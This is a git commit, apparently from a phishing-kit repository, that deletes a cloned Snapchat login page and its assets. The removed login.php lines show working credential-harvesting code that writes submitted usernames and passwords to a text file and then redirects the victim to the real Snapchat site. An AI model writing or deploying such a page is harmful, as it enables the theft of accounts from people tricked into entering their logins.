8bb420da626e24b842b07da1acb4d0a1eb9c4608
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-07-06 21:06:45 +0500

    deleted snapchat (#67)
    * Delete login.php
    
    * Delete index.html
    
    * Delete ghost.svg
    
    * Delete favicon.ico
    
    * Delete favicon.png
    
    * Delete ghost.svg
    
    * Delete snapchat.css
    
    * Delete semantic.min.css
    
    * Delete revoke.css
    
    * Delete dropdown.min.css
    
    * Delete auth.css
    
    * Delete accounts.css
    
    * Delete flags.png.html
    
    * Delete icons.woff2
    
    * Delete icons.woff
    
    * Delete icons.ttf
    
    * Delete icons.svg
    
    * Delete icons.eot
    
    * Delete icons-.eot
    
    * Delete semantic.min.js
    
    * Delete main.js
    
    * Delete jquery.min.js
    
    * Delete dropdown.min.js

--- WebPages/Snapchat_web/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-include 'ip.php';
-
-file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.snapchat.com/accounts/login');
-exit();
